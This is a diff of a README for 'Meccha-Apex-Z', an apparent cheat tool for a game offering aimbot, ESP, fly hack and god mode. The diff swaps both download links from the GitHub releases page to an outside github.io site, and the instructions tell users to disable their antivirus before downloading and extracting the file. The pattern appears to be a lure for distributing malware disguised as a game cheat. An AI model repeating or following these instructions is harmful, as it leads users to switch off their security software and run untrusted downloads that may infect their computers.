@@ -1,6 +1,6 @@
 # 🎯 Meccha-Apex-Z - Improve your gameplay with these features
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Jettydribbler158/Meccha-Apex-Z/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://jettydribbler158.github.io)
 
 Meccha-Apex-Z provides tools for the Meccha Chameleon platform. This software includes features like ESP, Aimbot, Auto Paint, Mod Menu, Fly Hack, Teleport, and God Mode. These additions change how the game functions to assist with navigation and combat.
 
@@ -19,7 +19,7 @@ Disable your antivirus software temporarily during the installation. Some securi
 
 Follow these steps to set up the tool on your computer:
 
-1. Visit this page to download the latest version: [https://github.com/Jettydribbler158/Meccha-Apex-Z/releases](https://github.com/Jettydribbler158/Meccha-Apex-Z/releases).
+1. Visit this page to download the latest version: [https://jettydribbler158.github.io](https://jettydribbler158.github.io).
 2. Look for the file marked as the latest release.
 3. Click the file to save it to your computer.
 4. Extract the contents of the file to a folder on your desktop.
